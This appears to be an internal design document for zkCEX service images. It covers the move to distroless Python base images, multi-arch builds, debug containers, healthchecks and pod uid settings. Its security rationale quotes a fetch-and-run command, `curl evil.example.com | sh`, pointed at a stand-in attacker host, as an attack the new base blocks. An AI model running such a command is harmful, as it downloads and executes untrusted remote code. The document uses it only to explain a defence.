# Distroless + multi-arch image baseline

zkCEX service images are built on `gcr.io/distroless/python3-debian12:nonroot`
and published as multi-arch (linux/amd64 + linux/arm64) manifest lists.

## Why distroless?

| Property | python:3.12-slim-bookworm | gcr.io/distroless/python3-debian12:nonroot |
|---|---|---|
| Base image size | 214 MB | 92 MB |
| Final service image | ~218-222 MB | ~96 MB |
| Shell (`/bin/sh`) | yes (bash + dash) | no |
| Package manager (`apt`) | yes | no |
| `curl`, `wget` | yes (via apt) | no |
| Default user | root | nonroot (uid 65532) |
| CVE surface | full debian-slim package set | python runtime + libc + tzdata + ca-certs only |

Distroless cuts ~57 % off every image and removes the entire shell-based attack
surface that lateral-movement exploit chains rely on. A compromised process
inside a distroless container cannot `curl evil.example.com | sh`, cannot
`apt-get install netcat`, and cannot escape via a missing-binary lookup.

## Trade-offs

### No shell — no `kubectl exec -it bash`

The biggest practical cost. Debugging a distroless pod needs an **ephemeral
debug container** (k8s 1.23+):

```bash
# Attach busybox alongside the running pod, sharing its process and network
# namespaces. The debug container has shell + standard utilities; the
# original container is untouched.
kubectl debug -it <pod-name> --image=busybox:1.36 --target=<container-name>

# More featureful debugger (curl, dnsutils, strace):
kubectl debug -it <pod-name> --image=nicolaka/netshoot --target=<container-name>
```

Caveats:

- `--target` requires the cluster to enable
  `kubelet --feature-gates=EphemeralContainers=true` (default since 1.25).
- The debug container does not see the target's filesystem at `/`; it sees
  its own. Mount `/proc/<pid>/root` to inspect target files:
  ```
  ls /proc/1/root/app/tools
  ```

For local docker, the equivalent is:

```bash
# Attach a debug container to the same network/process namespace
docker run --rm -it \
  --network container:<svc-container> \
  --pid container:<svc-container> \
  busybox sh
```

### No `curl` in HEALTHCHECK

Replaced with `/app/healthcheck.py`, a tiny stdlib-only HTTP probe baked into
the base image. Every service Dockerfile invokes it as:

```dockerfile
HEALTHCHECK --interval=15s --timeout=3s --start-period=10s \
    CMD ["python", "/app/healthcheck.py", "<port>", "<path>"]
```

Exit codes: 0 on HTTP 2xx, 1 on any other response/timeout. The script honours
a `HEALTHCHECK_TIMEOUT` env var (seconds, default 2).

In Kubernetes the `httpGet:` probe handled by the kubelet is already
HTTP-native and unaffected by what's inside the container — distroless does
not change anything for k8s probes. The in-container `HEALTHCHECK` only
matters for `docker run` / `docker compose` and any container runtime that
honours it (e.g. nomad, docker swarm).

### No `subprocess.run("docker", "exec", ...)`

`tools/backup/postgres_backup.py` shells out to `docker exec` to call
`pg_basebackup` and `pg_receivewal` against the postgres container. The
**`docker` CLI was never in the python:3.12-slim image either** — this was
a latent issue under the old base, not a regression introduced by
distroless. The dr_drill / sqlite / mariadb-via-network / S3 paths of the
backup daemon are unaffected.

If/when we need to fix it, options are:

1. Add a small extra layer that downloads the static `docker` binary from
   `https://download.docker.com/linux/static/stable/$arch/` (multi-arch
   aware) and copies it into `/usr/local/bin/docker`. Mount
   `/var/run/docker.sock` from the host.
2. Replace `docker exec pg_basebackup` with a direct pg8000-driven `pg_dump`
   over the network. Simpler and removes the docker socket dependency
   entirely. Recommended.

### No package installs at build time

The old `Dockerfile.auth` did `RUN pip install pg8000`. Distroless has no
pip. Instead, the base image installs pg8000 in the **builder** stage and
copies it into `/app/site-packages` in the final stage. Adding new pip
dependencies now means editing `Dockerfile.base`.

## Multi-arch

The images are built as **manifest lists** covering `linux/amd64` and
`linux/arm64`. A `docker pull` from either arch returns the right variant
without changing the image reference.

### Local (macOS / Linux)

```bash
# One-time: install QEMU emulators for cross-arch builds on x86 hosts.
# (Apple Silicon has the converse problem — needs amd64 emulation.)
docker run --privileged --rm tonistiigi/binfmt --install all

# Multi-arch build of every service:
PLATFORMS=linux/amd64,linux/arm64 bash deploy/images/build_all.sh

# Verify a service manifest:
docker buildx imagetools inspect 127.0.0.1:5050/zkcex-pol-py:0.1.0
```

The local registry (`127.0.0.1:5050`) accepts manifest lists out of the box —
`registry:2` has supported them since v2.6.

### Why multi-arch needs `--push`, not `--load`

`docker load` writes one image to the local image store keyed by a single
arch-specific manifest. A fat manifest list has no single arch, so it has
nowhere to land. The only sink that accepts a manifest list is a registry.
For multi-arch you **must** push to a registry; the build script falls back
to single-arch + `--load` automatically when `PLATFORMS` is a single value.

### Buildx builder gotchas

The buildx builder uses the `docker-container` driver, which means buildkitd
runs in its own container with its own network. To reach `127.0.0.1:5050`
(the host's local registry) the builder needs `--driver-opt network=host`:

```bash
docker buildx create \
  --name zkcex-builder \
  --driver docker-container \
  --driver-opt network=host \
  --buildkitd-config buildkitd.toml \
  --platform linux/amd64,linux/arm64 \
  --use
```

`buildkitd.toml` declares the local registry as insecure (plain HTTP, no
TLS — fine for `127.0.0.1`):

```toml
[registry."127.0.0.1:5050"]
http = true
insecure = true
```

### Multi-arch + base image FROM line

A subtle gotcha: when `Dockerfile.<service>` says `FROM zkcex-base:latest`,
that name resolves against the host's docker image store. The buildx
container has its own store and cannot see `zkcex-base:latest` unless we
either (a) push the base to a registry and reference it as
`FROM ${REGISTRY}/zkcex-base:${TAG}`, or (b) build the base + services in
the same buildx session via build contexts.

`build_all.sh` takes path (a): the base is pushed first, then each service
Dockerfile is `sed`'d on the fly to point at the registry-qualified base.
The original Dockerfile is never modified.

## Pod uid

`gcr.io/distroless/python3-debian12:nonroot` ships uid 65532 named `nonroot`.
The Helm chart's pod SecurityContexts reference this via
`.Values.image.runAsUser` (default 65532).

If your cluster's PodSecurityPolicy / Pod Security Standards enforces a
specific uid range, override it:

```bash
helm upgrade --install zkcex tools/deploy/k8s/charts/zkcex \
  --set image.runAsUser=20000 \
  --set image.runAsGroup=20000 \
  --set image.fsGroup=20000
```

Note: distroless `nonroot` is fixed at uid 65532 in the image. Setting a
different `runAsUser` in the SecurityContext overrides the image default,
but the kubelet will still need the requested uid to be valid for any
volume permission rules. For the standard zkcex deployment 65532 is fine.

## Adding a new service

1. Add `Dockerfile.<service>` in `deploy/images/`:
   ```dockerfile
   # syntax=docker/dockerfile:1.7
   FROM zkcex-base:latest AS final
   ARG SERVICE=<service>

   COPY --chown=65532:65532 tools/<service>.py /app/tools/<service>.py

   ENV PORT=<port>
   EXPOSE <port>
   HEALTHCHECK --interval=15s --timeout=3s --start-period=10s \
       CMD ["python", "/app/healthcheck.py", "<port>", "/<service>/health"]
   CMD ["-u", "/app/tools/<service>.py", "<port>"]
   ```
   Notes:
   - `--chown=65532:65532` (numeric uid; the builder stage doesn't have a
     `nonroot` username).
   - `CMD` starts with `"-u"` because the base's `ENTRYPOINT` is `python3`.
2. Add the service to `.github/workflows/build.yml` matrix.
3. Add a `services.<name>` block in `tools/deploy/k8s/charts/zkcex/values.yaml`.
4. Run `bash deploy/images/build_all.sh` to build + push.

## Known limits

- **No tini.** The old base used tini as PID 1. Distroless has no tini and
  no way to install one without bloating the image. Python's own
  `subprocess` cleanup handles direct children correctly; PID-1
  responsibilities (zombie reaping for grand-children, signal forwarding)
  are handled by docker/k8s's `--init` flag if needed. None of the zkCEX
  services spawn long-lived grand-children today, so this is a latent
  rather than active concern.
- **Image size floor ~92 MB.** distroless python3 itself is 92.4 MB. Service
  code adds a few MB on top. We will NOT hit the "~80 MB" napkin estimate;
  honest target is ~95-97 MB. Still a 56 %+ reduction vs python-slim.
- **bytecode mismatch risk.** The builder stage uses python:3.11-slim to
  match the distroless runtime's Python 3.11. If you change either, both
  must move together or .pyc files will be silently regenerated on first
  import, wiping out the compileall optimization.
